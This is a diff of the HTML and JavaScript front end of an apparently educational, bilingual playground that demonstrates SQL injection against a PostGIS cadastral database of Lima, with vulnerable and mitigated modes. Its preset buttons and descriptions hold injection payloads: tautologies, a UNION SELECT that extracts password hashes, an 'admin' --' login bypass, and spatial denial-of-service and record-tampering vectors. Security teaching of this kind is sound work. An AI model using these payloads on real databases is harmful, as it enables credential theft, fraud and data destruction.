@@ -335,6 +335,43 @@
     }
     .status-dot.online { background: var(--success); }
     .status-dot.danger { background: var(--danger); }
+
+    /* Badges flotantes interactivos sobre el mapa */
+    .map-badge-green {
+      background: #064e3b !important;
+      color: #6ee7b7 !important;
+      border: 1px solid #10b981 !important;
+      font-weight: 700 !important;
+      font-size: 11px !important;
+      border-radius: 4px !important;
+      padding: 3px 7px !important;
+      box-shadow: 0 2px 6px rgba(0,0,0,0.3) !important;
+    }
+    .map-badge-orange {
+      background: #7c2d12 !important;
+      color: #fed7aa !important;
+      border: 1px solid #f97316 !important;
+      font-weight: 700 !important;
+      font-size: 11px !important;
+      border-radius: 4px !important;
+      padding: 3px 7px !important;
+      box-shadow: 0 2px 6px rgba(0,0,0,0.3) !important;
+    }
+    .map-badge-purple {
+      background: #4c1d95 !important;
+      color: #ddd6fe !important;
+      border: 1px solid #a855f7 !important;
+      font-weight: 700 !important;
+      font-size: 11px !important;
+      border-radius: 4px !important;
+      padding: 3px 7px !important;
+      box-shadow: 0 2px 6px rgba(0,0,0,0.3) !important;
+    }
+    tr.table-active-focus {
+      background-color: #fef08a !important;
+      outline: 2px solid #eab308;
+      transition: background-color 0.25s ease;
+    }
   </style>
 </head>
 <body>
@@ -344,9 +381,9 @@
     <div class="d-flex align-items-center gap-2">
       <div class="brand-title">
         <i class="fa-solid fa-shield-halved text-primary"></i>
-        <span>Playground SQLi PostGIS</span>
+        <span id="txtBrandTitle">Playground SQLi PostGIS</span>
       </div>
-      <span class="badge bg-light text-secondary border font-mono" style="font-size: 0.7rem;">Puno // EPSG:32719</span>
+      <span class="badge bg-light text-secondary border font-mono" style="font-size: 0.7rem;" id="txtBrandBadge">Lima Metropolitana // EPSG:32718</span>
     </div>
 
     <div class="d-flex flex-wrap align-items-center gap-3">
@@ -358,9 +395,16 @@
         <strong id="lblTotalTitulares" class="text-dark">...</strong>
       </div>
 
-      <button class="btn btn-sm btn-outline-secondary font-mono" onclick="resetDatabase()" id="btnResetDb" title="Restaura la muestra original de 487 lotes">
-        <i class="fa-solid fa-rotate-right me-1"></i> <span id="txtResetDb">Restaurar BD</span>
-      </button>
+      <div class="d-flex align-items-center gap-1">
+        <select id="selDatasetScale" class="form-select form-select-sm font-mono py-1" style="font-size: 0.75rem; width: auto;" onchange="resetDatabase()" title="Trama urbana continua de Lima (OpenStreetMap, EPSG:32718)">
+          <option value="487" id="optScale487">487 lotes (Lima Centro Histórico)</option>
+          <option value="5000" id="optScale5000">5,000 lotes (Lima Centro-Sur)</option>
+          <option value="25000" id="optScale25000">25,000 lotes (Lima Metropolitana)</option>
+        </select>
+        <button class="btn btn-sm btn-outline-secondary font-mono" onclick="resetDatabase()" id="btnResetDb" title="Restaura el catastro a la escala seleccionada">
+          <i class="fa-solid fa-rotate-right me-1"></i> <span id="txtResetDb">Restaurar BD</span>
+        </button>
+      </div>
 
       <!-- SELECTOR DE MODO -->
       <div class="segmented-control">
@@ -370,7 +414,7 @@
         </button>
         <button id="btnModeMit" class="segmented-btn" onclick="setMode('mitigated')">
           <i class="fa-solid fa-shield"></i>
-          <span id="txtModeMit">Mitigado (3 Barreras)</span>
+          <span id="txtModeMit">Mitigado (SCIG + ORM)</span>
         </button>
       </div>
 
@@ -399,7 +443,7 @@
       <div class="col-lg-6">
         <div class="input-group">
           <input type="text" id="inputCriterio" class="form-control font-mono" style="font-size: 0.82rem;"
-                 placeholder="Ingresa ID de lote, titular o payload (ej: 21010101000000 o ' OR '1'='1)..."
+                 placeholder="Ingresa ID de lote, titular o payload (ej: 15010100000001 o ' OR '1'='1)..."
                  oninput="updateLiveConcatPreview()"
                  onkeydown="if(event.key === 'Enter') ejecutarBusquedaLotes()">
           <button class="btn btn-primary px-3" onclick="ejecutarBusquedaLotes()" style="font-size: 0.82rem;" id="btnEvalSearch">
@@ -415,7 +459,7 @@
       <div class="col-lg-6">
         <div class="d-flex flex-wrap gap-1 align-items-center justify-content-lg-end">
           <span class="text-secondary me-1" style="font-size: 0.72rem;" id="txtQuickLoads">Cargas Rápidas:</span>
-          <button class="btn btn-sm btn-light border font-mono py-1 px-2" style="font-size: 0.72rem;" onclick="setSearchPayload('21010101000000')" id="btnPresetNormal">Normal (1 lote)</button>
+          <button class="btn btn-sm btn-light border font-mono py-1 px-2" style="font-size: 0.72rem;" onclick="setSearchPayload('15010100000001')" id="btnPresetNormal">Normal (1 lote)</button>
           <button class="btn btn-sm btn-light border text-danger font-mono py-1 px-2" style="font-size: 0.72rem;" onclick="setSearchPayload(&quot;' OR '1'='1&quot;)" id="btnPresetTaut">Tautología (' OR '1'='1)</button>
           <button class="btn btn-sm btn-light border text-danger font-mono py-1 px-2" style="font-size: 0.72rem;" onclick="setSearchPayload(&quot;%' OR 1=1 --&quot;)" id="btnPresetComment">Comentario (1=1 --)</button>
           <button class="btn btn-sm btn-light border text-warning font-mono py-1 px-2" style="font-size: 0.72rem;" onclick="setSearchPayload(&quot;' UNION SELECT username, role, 'EXFILTRADO', password_hash, 0, NULL FROM catastro_usuarios --&quot;)" id="btnPresetUnion">UNION Passwords</button>
@@ -463,12 +507,12 @@
     </div>
   </section>
 
-  <!-- 3. PIPELINE DE MITIGACIÓN (DEFENSA EN PROFUNDIDAD) -->
+  <!-- 3. PIPELINE DE MITIGACIÓN (DEFENSA EN PROFUNDIDAD SCIG + ORM) -->
   <section class="pipeline-wrapper">
     <div class="d-flex justify-content-between align-items-center mb-2">
       <div class="d-flex align-items-center gap-2">
         <span class="fw-bold" style="font-size: 0.82rem;">
-          <i class="fa-solid fa-layer-group text-primary me-1"></i> <span id="txtPipelineTitle">Pipeline de Mitigación (Defensa en Profundidad)</span>
+          <i class="fa-solid fa-layer-group text-primary me-1"></i> <span id="txtPipelineTitle">Pipeline de Mitigación (Guardia SCIG + Enlace Binario ORM)</span>
         </span>
         <span class="badge bg-danger font-mono" id="pipelineStatusBadge" style="font-size: 0.68rem;">MODO VULNERABLE</span>
       </div>
@@ -483,8 +527,8 @@
             <span class="fw-bold text-primary" style="font-size: 0.75rem;" id="txtB1Tag">Barrera 1 (API)</span>
             <span class="badge bg-white text-secondary border font-mono" id="statusBarrier1" style="font-size: 0.65rem;">STANDBY</span>
           </div>
-          <div class="fw-semibold mt-1" style="font-size: 0.8rem;" id="txtB1Name">Pydantic & Acotamiento</div>
-          <div class="text-secondary" style="font-size: 0.7rem;" id="txtB1Desc">Tipado numérico, regex y validación de rangos.</div>
+          <div class="fw-semibold mt-1" style="font-size: 0.8rem;" id="txtB1Name">Fijación CRS & Cota MBR</div>
+          <div class="text-secondary" style="font-size: 0.7rem;" id="txtB1Desc">Fija EPSG:32718, tipado estricto y área MBR ≤ 10 km².</div>
         </div>
       </div>
 
@@ -496,11 +540,11 @@
       <div class="col-md">
         <div class="barrier-box" id="cardBarrier2">
           <div class="d-flex justify-content-between align-items-center">
-            <span class="fw-bold text-info" style="font-size: 0.75rem;" id="txtB2Tag">Barrera 2 (App)</span>
+            <span class="fw-bold text-info" style="font-size: 0.75rem;" id="txtB2Tag">Barrera 2 (SCIG)</span>
             <span class="badge bg-white text-secondary border font-mono" id="statusBarrier2" style="font-size: 0.65rem;">STANDBY</span>
           </div>
-          <div class="fw-semibold mt-1" style="font-size: 0.8rem;" id="txtB2Name">Shapely Topology</div>
-          <div class="text-secondary" style="font-size: 0.7rem;" id="txtB2Desc">Validación topológica WKT en memoria previa a SQL.</div>
+          <div class="fw-semibold mt-1" style="font-size: 0.8rem;" id="txtB2Name">DE-9IM & Costo C_geom ≤ 5000</div>
+          <div class="text-secondary" style="font-size: 0.7rem;" id="txtB2Desc">Valida POLYGON simple en Shapely, tolerancia ≤ 0.5m y costo GEOS.</div>
         </div>
       </div>
 
@@ -515,8 +559,8 @@
             <span class="fw-bold text-success" style="font-size: 0.75rem;" id="txtB3Tag">Barrera 3 (Motor)</span>
             <span class="badge bg-white text-secondary border font-mono" id="statusBarrier3" style="font-size: 0.65rem;">STANDBY</span>
           </div>
-          <div class="fw-semibold mt-1" style="font-size: 0.8rem;" id="txtB3Name">GeoAlchemy2 / Bind ORM</div>
-          <div class="text-secondary" style="font-size: 0.7rem;" id="txtB3Desc">Prepared statements y parámetros compilados.</div>
+          <div class="fw-semibold mt-1" style="font-size: 0.8rem;" id="txtB3Name">Bind EWKB & Timeout 2000ms</div>
+          <div class="text-secondary" style="font-size: 0.7rem;" id="txtB3Desc">Parámetros binarios GeoAlchemy2 y statement_timeout=2000ms.</div>
         </div>
       </div>
     </div>
@@ -533,7 +577,7 @@
         <div class="d-flex justify-content-between align-items-center mb-2">
           <div class="d-flex align-items-center gap-2">
             <i class="fa-solid fa-map text-primary"></i>
-            <span class="fw-bold" style="font-size: 0.85rem;" id="txtMapTitle">Cartografía Catastral de Puno</span>
+            <span class="fw-bold" style="font-size: 0.85rem;" id="txtMapTitle">Cartografía Catastral (Sur del Perú - OSM)</span>
             <span class="badge bg-light text-secondary border" id="lblMapStatus" style="font-size: 0.68rem;">Listo</span>
           </div>
           <button class="btn btn-xs btn-outline-secondary font-mono py-0 px-2" onclick="fitCatastroBounds()" style="font-size: 0.72rem;" id="btnCenterMap">
@@ -545,7 +589,7 @@
 
         <div class="d-flex justify-content-between align-items-center mt-2 text-secondary" style="font-size: 0.72rem;">
           <span id="txtMapLegend">Capa base: <strong>OpenStreetMap</strong>. Polígonos en <strong class="text-danger">rojo</strong> indican parcelas expuestas o afectadas.</span>
-          <span class="font-mono" id="lblCoords">Puno, Perú</span>
+          <span class="font-mono" id="lblCoords">Lima (EPSG:32718)</span>
         </div>
       </div>
 
@@ -616,7 +660,7 @@
         <!-- Explicación Pedagógica -->
         <div class="p-2 rounded bg-light border text-secondary" style="font-size: 0.75rem; line-height: 1.4;" id="boxExplanation">
           <i class="fa-solid fa-circle-info text-primary me-1"></i>
-          <strong>Diagnóstico:</strong> Selecciona cualquier vector de la derecha o evalúa un criterio para observar el flujo interno de la consulta.
+          <strong>Diagnóstico:</strong> Selecciona cualquier vector espacial (V1–V6) de la derecha para observar su ejecución en tiempo real.
         </div>
       </div>
 
@@ -625,11 +669,11 @@
     <!-- COLUMNA DERECHA -->
     <div class="col-lg-5">
       
-      <!-- BATERÍA DE LAS 6 AMENAZAS -->
+      <!-- BATERÍA DE LAS 6 AMENAZAS ESPACIALES -->
       <div class="app-card mb-3">
         <div class="d-flex justify-content-between align-items-center mb-2">
           <span class="fw-bold" style="font-size: 0.85rem;">
-            <i class="fa-solid fa-flask-vial text-primary me-1"></i> <span id="txtThreatsTitle">Vectores de Explotación (V1 - V6)</span>
+            <i class="fa-solid fa-flask-vial text-primary me-1"></i> <span id="txtThreatsTitle">Vectores Espaciales PostGIS (V1 - V6)</span>
           </span>
           <span class="text-secondary" style="font-size: 0.72rem;" id="txtThreatsSub">Haz clic para ejecutar</span>
         </div>
@@ -638,22 +682,33 @@
           <!-- V1 -->
           <div class="scenario-item" onclick="runAttack1_Bypass()" id="btnAtk1">
             <div class="d-flex justify-content-between align-items-center">
-              <span class="fw-bold text-danger" style="font-size: 0.78rem;">1. Spatial Logic Bypass</span>
+              <span class="fw-bold text-danger" style="font-size: 0.78rem;" id="txtV1Title">1. Confusión CRS y Bypass ST_DWithin</span>
               <span class="badge bg-light text-secondary border font-mono" style="font-size: 0.62rem;">GET /predios/radio</span>
             </div>
             <div class="text-secondary" style="font-size: 0.72rem;" id="txtV1Desc">
-              Rompe el filtro de proximidad <code>ST_DWithin</code> mediante tautología <code>50) OR (1=1</code>.
+              Inyecta <code>srid=4326</code> o tautología <code>50) OR (1=1</code> para evadir el filtro de proximidad en <code>ST_Transform</code>.
             </div>
           </div>
 
           <!-- V2 -->
-          <div class="scenario-item" onclick="runAttack2_ErrorBased()" id="btnAtk2">
+          <div class="scenario-item" onclick="runAttack2_MbrPoisoning()" id="btnAtk2">
             <div class="d-flex justify-content-between align-items-center">
-              <span class="fw-bold text-warning" style="font-size: 0.78rem;">2. Error-Based Spatial SQLi</span>
-              <span class="badge bg-light text-secondary border font-mono" style="font-size: 0.62rem;">GET /predios/poligono</span>
+              <span class="fw-bold text-danger" style="font-size: 0.78rem;" id="txtV2Title">2. Envenenamiento MBR e Índice GiST</span>
+              <span class="badge bg-light text-secondary border font-mono" style="font-size: 0.62rem;">GET /predios/bbox</span>
             </div>
             <div class="text-secondary" style="font-size: 0.72rem;" id="txtV2Desc">
-              Canal lateral: fuerza excepciones en GEOS para inferir contraseñas bit a bit.
+              Inyecta diagonal <code>LINESTRING(200000 8150000, 405000 8300000)</code> (30,750 km²) al operador <code>&amp;&amp;</code> vaciando el catastro.
+            </div>
+          </div>
+
+          <!-- V3 -->
+          <div class="scenario-item" onclick="runAttack3_ErrorBased()" id="btnAtk3">
+            <div class="d-flex justify-content-between align-items-center">
+              <span class="fw-bold text-warning" style="font-size: 0.78rem;" id="txtV3Title">3. Canal Lateral de Error GEOS</span>
+              <span class="badge bg-light text-secondary border font-mono" style="font-size: 0.62rem;">GET /predios/poligono</span>
+            </div>
+            <div class="text-secondary" style="font-size: 0.72rem;" id="txtV3Desc">
+              Fuerza excepciones topológicas en el motor C++ GEOS para inferir credenciales carácter por carácter.
             </div>
             <div class="mt-1 pt-1 border-top d-flex justify-content-end">
               <button class="btn btn-xs btn-outline-warning py-0 px-2" style="font-size: 0.65rem;" onclick="event.stopPropagation(); startLiveErrorBlindExfiltration()" id="btnSimBlind">
@@ -662,47 +717,46 @@
             </div>
           </div>
 
-          <!-- V3 -->
-          <div class="scenario-item" onclick="runAttack3_SpatialDoS()" id="btnAtk3">
+          <!-- V4 -->
+          <div class="scenario-item" onclick="runAttack4_SpatialDoS()" id="btnAtk4">
             <div class="d-flex justify-content-between align-items-center">
-              <span class="fw-bold text-danger" style="font-size: 0.78rem;">3. Spatial DoS (Algorithmic Complexity)</span>
+              <span class="fw-bold text-danger" style="font-size: 0.78rem;" id="txtV4Title">4. DoS de Complejidad Buffer O(V²)</span>
               <span class="badge bg-light text-secondary border font-mono" style="font-size: 0.62rem;">GET /analisis-expansion</span>
             </div>
-            <div class="text-secondary" style="font-size: 0.72rem;" id="txtV3Desc">
-              Fuerza producto cruzado O(N²) en <code>ST_Buffer</code> saturando la CPU de PostgreSQL.
-            </div>
-          </div>
-
-          <!-- V4 -->
-          <div class="scenario-item" onclick="runAttack4_Tampering()" id="btnAtk4">
-            <div class="d-flex justify-content-between align-items-center">
-              <span class="fw-bold text-warning" style="font-size: 0.78rem;">4. Fraude Catastral (Tampering)</span>
-              <span class="badge bg-light text-secondary border font-mono" style="font-size: 0.62rem;">POST /ficha/modificar</span>
-            </div>
             <div class="text-secondary" style="font-size: 0.72rem;" id="txtV4Desc">
-              Inyección en UPDATE para reducir autovalúo a S/ 0.00 y usurpar titularidad predial.
+              Amplifica <code>quad_segs=192</code> en <code>ST_Buffer</code> + <code>ST_Intersection</code> generando 345,600 vértices en GEOS.
             </div>
           </div>
 
           <!-- V5 -->
-          <div class="scenario-item" onclick="runAttack5_DataDestruction()" id="btnAtk5">
+          <div class="scenario-item" onclick="runAttack5_TypeCoercion()" id="btnAtk5">
             <div class="d-flex justify-content-between align-items-center">
-              <span class="fw-bold text-danger" style="font-size: 0.78rem;">5. Destrucción de Cartografía</span>
-              <span class="badge bg-light text-secondary border font-mono" style="font-size: 0.62rem;">DELETE /predios/borrar</span>
+              <span class="fw-bold text-warning" style="font-size: 0.78rem;" id="txtV5Title">5. Coerción GEOMETRYCOLLECTION (DE-9IM)</span>
+              <span class="badge bg-light text-secondary border font-mono" style="font-size: 0.62rem;">POST /ficha/geometria</span>
             </div>
             <div class="text-secondary" style="font-size: 0.72rem;" id="txtV5Desc">
-              Tautología <code>0101' OR '1'='1</code> que purga incondicionalmente las parcelas del catastro.
+              Pasa <code>ST_IsValid()=TRUE</code> con una colección heterogénea degenerada que anula el área predial a 0.0 m².
             </div>
           </div>
 
           <!-- V6 -->
-          <div class="scenario-item" onclick="runAttack6_AuthBypass()" id="btnAtk6">
+          <div class="scenario-item" onclick="runAttack6_GridSnapCollapse()" id="btnAtk6">
             <div class="d-flex justify-content-between align-items-center">
-              <span class="fw-bold text-primary" style="font-size: 0.78rem;">6. Bypass de Autenticación</span>
-              <span class="badge bg-light text-secondary border font-mono" style="font-size: 0.62rem;">POST /auth/login</span>
+              <span class="fw-bold text-danger" style="font-size: 0.78rem;" id="txtV6Title">6. Colapso Topológico ST_SnapToGrid</span>
+              <span class="badge bg-light text-secondary border font-mono" style="font-size: 0.62rem;">POST /depurar-topologia</span>
             </div>
             <div class="text-secondary" style="font-size: 0.72rem;" id="txtV6Desc">
-              Comentario SQL <code>admin' --</code> que anula la verificación de password otorgando acceso administrativo.
+              Inyecta malla gruesa <code>tolerancia=5000.0</code> m colapsando todos los vértices del sector a un único punto de área 0.0 m².
+            </div>
+          </div>
+
+          <!-- Ataques Relacionales Clásicos (Acceso rápido en 1 clic) -->
+          <div class="pt-1 mt-1 border-top d-flex flex-wrap justify-content-between align-items-center gap-1">
+            <span class="text-secondary font-mono" style="font-size: 0.68rem;" id="txtDmlTitle">DML / Auth Clásico:</span>
+            <div class="d-flex gap-1">
+              <button class="btn btn-xs btn-outline-warning font-mono py-0 px-2" style="font-size: 0.66rem;" onclick="runAttack_Tampering()" id="btnDmlTamper">Fraude UPDATE</button>
+              <button class="btn btn-xs btn-outline-danger font-mono py-0 px-2" style="font-size: 0.66rem;" onclick="runAttack_DataDestruction()" id="btnDmlPurge">Purga DELETE</button>
+              <button class="btn btn-xs btn-outline-primary font-mono py-0 px-2" style="font-size: 0.66rem;" onclick="runAttack_AuthBypass()" id="btnDmlAuth">Auth Bypass</button>
             </div>
           </div>
         </div>
@@ -725,10 +779,11 @@
                 <th id="thLadmDni">DNI</th>
                 <th id="thLadmTitular">TITULAR PREDIAL</th>
                 <th id="thLadmAuto">AUTOVALÚO</th>
+                <th id="thLadmAction">ACCIÓN</th>
               </tr>
             </thead>
             <tbody id="tblTitulares" class="font-mono">
-              <tr><td colspan="4" class="text-center text-secondary py-2" id="txtLadmLoading">Cargando datos catastrales...</td></tr>
+              <tr><td colspan="5" class="text-center text-secondary py-2" id="txtLadmLoading">Cargando datos catastrales...</td></tr>
             </tbody>
           </table>
         </div>
@@ -745,18 +800,24 @@
     let currentLang = 'es';
     const API_BASE = window.location.origin + '/api/v1';
 
-    // Diccionario Bilingüe (Español / Inglés)
+    // Diccionario Bilingüe Completo (Español / Inglés)
     const I18N = {
       es: {
+        brandTitle: "Playground SQLi PostGIS",
+        brandBadge: "Lima Metropolitana // EPSG:32718",
         tagLotes: "Lotes:",
         tagTitulares: "Titulares:",
+        optScale487: "487 lotes (Lima Centro Histórico)",
+        optScale5000: "5,000 lotes (Lima Centro-Sur)",
+        optScale25000: "25,000 lotes (Lima Metropolitana)",
+        scaleTitle: "Trama urbana continua de Lima (OpenStreetMap, EPSG:32718)",
         resetDb: "Restaurar BD",
-        resetDbTitle: "Restaura la muestra original de 487 lotes",
+        resetDbTitle: "Restaura el catastro a la escala seleccionada",
         modeVuln: "Vulnerable",
-        modeMit: "Mitigado (3 Barreras)",
+        modeMit: "Mitigado (SCIG + ORM)",
         searchTitle: "Búsqueda Predial & Evaluación SQLi Manual",
         searchSub: "Evalúa cómo se compilan las consultas dinámicas vs parámetros ORM",
-        searchPlaceholder: "Ingresa ID de lote, titular o payload (ej: 21010101000000 o ' OR '1'='1)...",
+        searchPlaceholder: "Ingresa ID de lote, titular o payload (ej: 15010100000001 o ' OR '1'='1)...",
         evalBtn: "Evaluar",
         clearBtn: "Limpiar",
         quickLoads: "Cargas Rápidas:",
@@ -770,43 +831,54 @@
         thAuto: "AUTOVALÚO",
         thAction: "ACCIÓN",
         actionInspect: "Inspeccionar",
-        pipelineTitle: "Pipeline de Mitigación (Defensa en Profundidad)",
+        pipelineTitle: "Pipeline de Mitigación (Guardia SCIG + Enlace Binario ORM)",
         pipeVulnBadge: "MODO VULNERABLE",
-        pipeMitBadge: "DEFENSA ACTIVA (3 BARRERAS)",
+        pipeMitBadge: "DEFENSA ACTIVA (SCIG + ORM)",
         latencyPrefix: "Latencia:",
         b1Tag: "Barrera 1 (API)",
-        b1Name: "Pydantic & Acotamiento",
-        b1Desc: "Tipado numérico, regex y validación de rangos.",
-        b2Tag: "Barrera 2 (App)",
-        b2Name: "Shapely Topology",
-        b2Desc: "Validación topológica WKT en memoria previa a SQL.",
+        b1Name: "Fijación CRS & Cota MBR",
+        b1Desc: "Fija EPSG:32718, tipado estricto y área MBR ≤ 10 km².",
+        b2Tag: "Barrera 2 (SCIG)",
+        b2Name: "DE-9IM & Costo C_geom ≤ 5000",
+        b2Desc: "Valida POLYGON simple en Shapely, tolerancia ≤ 0.5m y costo GEOS.",
         b3Tag: "Barrera 3 (Motor)",
-        b3Name: "GeoAlchemy2 / Bind ORM",
-        b3Desc: "Prepared statements y parámetros compilados.",
-        mapTitle: "Cartografía Catastral de Puno",
+        b3Name: "Bind EWKB & Timeout 2000ms",
+        b3Desc: "Parámetros binarios GeoAlchemy2 y statement_timeout=2000ms.",
+        mapTitle: "Cartografía Catastral (Lima Metropolitana - OSM)",
         mapReady: "Listo",
         mapLoading: "Cargando...",
         mapActive: "Activo",
         mapError: "Error",
         centerBtn: "Centrar",
-        mapLegend: "Capa base: <strong>OpenStreetMap</strong>. Polígonos en <strong class=\"text-danger\">rojo</strong> indican parcelas expuestas o afectadas.",
+        mapLegend: "Capa base: <strong>OpenStreetMap</strong>. Trama urbana continua de Lima (EPSG:32718). Polígonos en <strong class=\"text-danger\">rojo</strong> indican parcelas expuestas.",
+        coordsLabel: "Lima (EPSG:32718)",
         inspectorTitle: "Inspector de Ejecución SQL & Diagnóstico",
         inspectorStandby: "EN ESPERA",
-        inspectorPrompt: "-- Selecciona un vector o realiza una búsqueda para inspeccionar la consulta generada --",
+        inspectorPrompt: "-- Selecciona un vector espacial de la derecha o ejecuta una consulta para inspeccionar el flujo interno --",
         metricLat: "LATENCIA",
         metricHttp: "ESTADO HTTP",
         metricDef: "DEFENSA ACTIVA",
         defNone: "Ninguna",
-        diagIntro: "<strong>Diagnóstico:</strong> Selecciona cualquier vector de la derecha o evalúa un criterio para observar el flujo interno de la consulta.",
-        threatsTitle: "Vectores de Explotación (V1 - V6)",
+        diagIntro: "<strong>Diagnóstico:</strong> Selecciona cualquier vector espacial (V1–V6) de la derecha para observar su ejecución en tiempo real.",
+        threatsTitle: "Vectores Espaciales PostGIS (V1 - V6)",
         threatsSub: "Haz clic para ejecutar",
-        v1Desc: "Rompe el filtro de proximidad <code>ST_DWithin</code> mediante tautología <code>50) OR (1=1</code>.",
-        v2Desc: "Canal lateral: fuerza excepciones en GEOS para inferir contraseñas bit a bit.",
-        v2SimBtn: "Simular Inferencia Ciega",
-        v3Desc: "Fuerza producto cruzado O(N²) en <code>ST_Buffer</code> saturando la CPU de PostgreSQL.",
-        v4Desc: "Inyección en UPDATE para reducir autovalúo a S/ 0.00 y usurpar titularidad predial.",
-        v5Desc: "Tautología <code>0101' OR '1'='1</code> que purga incondicionalmente las parcelas del catastro.",
-        v6Desc: "Comentario SQL <code>admin' --</code> que anula la verificación de password otorgando acceso administrativo.",
+        v1Title: "1. Confusión CRS y Bypass ST_DWithin",
+        v1Desc: "Inyecta <code>srid=4326</code> o tautología <code>50) OR (1=1</code> para evadir el filtro de proximidad en <code>ST_Transform</code>.",
+        v2Title: "2. Envenenamiento MBR e Índice GiST",
+        v2Desc: "Inyecta diagonal <code>LINESTRING(270000 8660000, 290000 8680000)</code> al operador <code>&amp;&amp;</code> vaciando el catastro metropolitano.",
+        v3Title: "3. Canal Lateral de Error GEOS",
+        v3Desc: "Fuerza excepciones topológicas en el motor C++ GEOS para inferir credenciales carácter por carácter.",
+        v3SimBtn: "Simular Inferencia Ciega",
+        v4Title: "4. DoS de Complejidad Buffer O(V²)",
+        v4Desc: "Amplifica <code>quad_segs=192</code> en <code>ST_Buffer</code> + <code>ST_Intersection</code> generando 345,600 vértices en GEOS.",
+        v5Title: "5. Coerción GEOMETRYCOLLECTION (DE-9IM)",
+        v5Desc: "Pasa <code>ST_IsValid()=TRUE</code> con una colección heterogénea degenerada que anula el área predial a 0.0 m².",
+        v6Title: "6. Colapso Topológico ST_SnapToGrid",
+        v6Desc: "Inyecta malla gruesa <code>tolerancia=5000.0</code> m colapsando todos los vértices del sector a un único punto de área 0.0 m².",
+        dmlTitle: "DML / Auth Clásico:",
+        btnDmlTamper: "Fraude UPDATE",
+        btnDmlPurge: "Purga DELETE",
+        btnDmlAuth: "Auth Bypass",
         ladmTitle: "Integridad Catastral (Muestra LADM)",
         ladmSub: "Muestra en vivo",
         ladmLoading: "Cargando datos catastrales...",
@@ -814,6 +886,7 @@
         thLadmDni: "DNI",
         thLadmTitular: "TITULAR PREDIAL",
         thLadmAuto: "AUTOVALÚO",
+        thLadmAction: "ACCIÓN",
         editorLabel: "Consola SQL Editable (Crea o modifica ataques custom):",
         btnResetSql: "Restaurar",
         btnClearSql: "Limpiar",
@@ -826,15 +899,21 @@
         liveConcatBadgeMit: "DEFENSA ACTIVA (Bind ORM)"
       },
       en: {
+        brandTitle: "PostGIS SQLi Playground",
+        brandBadge: "Lima Metropolitan Area // EPSG:32718",
         tagLotes: "Parcels:",
         tagTitulares: "Owners:",
+        optScale487: "487 parcels (Lima Historical Center)",
+        optScale5000: "5,000 parcels (Lima South-Central)",
+        optScale25000: "25,000 parcels (Lima Metropolitan)",
+        scaleTitle: "Continuous urban fabric of Lima (OpenStreetMap, EPSG:32718)",
         resetDb: "Reset DB",
-        resetDbTitle: "Restore original sample of 487 parcels",
+        resetDbTitle: "Restore cadastre to selected scale",
         modeVuln: "Vulnerable",
-        modeMit: "Mitigated (3 Barriers)",
+        modeMit: "Mitigated (SCIG + ORM)",
         searchTitle: "Cadastral Query & Manual SQLi Testing",
         searchSub: "Observe dynamic SQL compilation vs. parameterized ORM queries",
-        searchPlaceholder: "Enter parcel ID, owner name, or payload (e.g. 21010101000000 or ' OR '1'='1)...",
+        searchPlaceholder: "Enter parcel ID, owner name, or payload (e.g. 15010100000001 or ' OR '1'='1)...",
         evalBtn: "Execute",
         clearBtn: "Clear",
         quickLoads: "Quick Presets:",
@@ -848,43 +927,54 @@
         thAuto: "VALUATION",
         thAction: "ACTION",
         actionInspect: "Inspect",
-        pipelineTitle: "Mitigation Pipeline (Defense-in-Depth)",
+        pipelineTitle: "Mitigation Pipeline (SCIG Guard + Binary ORM Binding)",
         pipeVulnBadge: "VULNERABLE MODE",
-        pipeMitBadge: "ACTIVE DEFENSE (3 BARRIERS)",
+        pipeMitBadge: "ACTIVE DEFENSE (SCIG + ORM)",
         latencyPrefix: "Latency:",
         b1Tag: "Barrier 1 (API)",
-        b1Name: "Pydantic & Bounding",
-        b1Desc: "Numeric types, regex masks, and bounded limits.",
-        b2Tag: "Barrier 2 (App)",
-        b2Name: "Shapely Topology",
-        b2Desc: "In-memory WKT topological validation prior to SQL.",
+        b1Name: "CRS Pinning & MBR Cap",
+        b1Desc: "Pins EPSG:32718, strict numeric bounds, and MBR area ≤ 10 km².",
+        b2Tag: "Barrier 2 (SCIG)",
+        b2Name: "DE-9IM & Cost C_geom ≤ 5000",
+        b2Desc: "Enforces simple POLYGON in Shapely, snap ≤ 0.5m, and GEOS cost cap.",
         b3Tag: "Barrier 3 (Engine)",
-        b3Name: "GeoAlchemy2 / Bind ORM",
-        b3Desc: "Prepared statements and compiled binary parameters.",
-        mapTitle: "Puno Cadastral Cartography",
+        b3Name: "EWKB Bind & 2000ms Timeout",
+        b3Desc: "GeoAlchemy2 binary parameters and statement_timeout=2000ms.",
+        mapTitle: "Cadastral Cartography (Lima Metropolitan - OSM)",
         mapReady: "Ready",
         mapLoading: "Loading...",
         mapActive: "Active",
         mapError: "Error",
         centerBtn: "Center",
-        mapLegend: "Base layer: <strong>OpenStreetMap</strong>. Polygons in <strong class=\"text-danger\">red</strong> indicate exposed or affected parcels.",
+        mapLegend: "Base layer: <strong>OpenStreetMap</strong>. Continuous urban fabric of Lima (EPSG:32718). Polygons in <strong class=\"text-danger\">red</strong> indicate exposed parcels.",
+        coordsLabel: "Lima (EPSG:32718)",
         inspectorTitle: "SQL Execution Inspector & Diagnostics",
         inspectorStandby: "STANDBY",
-        inspectorPrompt: "-- Select an attack vector or run a query to inspect the generated statement --",
+        inspectorPrompt: "-- Select a spatial attack vector on the right or run a query to inspect internal execution --",
         metricLat: "LATENCY",
         metricHttp: "HTTP STATUS",
         metricDef: "ACTIVE DEFENSE",
         defNone: "None",
-        diagIntro: "<strong>Diagnosis:</strong> Select any vector on the right or enter search criteria to observe internal query flow.",
-        threatsTitle: "Exploitation Vectors (V1 - V6)",
+        diagIntro: "<strong>Diagnosis:</strong> Select any spatial vector (V1–V6) on the right to inspect its execution flow.",
+        threatsTitle: "PostGIS Spatial Vectors (V1 - V6)",
         threatsSub: "Click to trigger",
-        v1Desc: "Bypasses <code>ST_DWithin</code> proximity filter via tautology <code>50) OR (1=1</code>.",
-        v2Desc: "Side-channel oracle: triggers GEOS exceptions to infer passwords bit by bit.",
-        v2SimBtn: "Simulate Blind Inference",
-        v3Desc: "Forces O(N²) Cartesian product in <code>ST_Buffer</code> saturating PostgreSQL CPU.",
-        v4Desc: "UPDATE injection reducing valuation to S/ 0.00 and usurping parcel ownership.",
-        v5Desc: "Tautology <code>0101' OR '1'='1</code> unconditionally purging the cadastral repository.",
-        v6Desc: "SQL comment <code>admin' --</code> bypassing password verification with administrative access.",
+        v1Title: "1. CRS Confusion & ST_DWithin Bypass",
+        v1Desc: "Injects <code>srid=4326</code> or tautology <code>50) OR (1=1</code> to bypass proximity filtering in <code>ST_Transform</code>.",
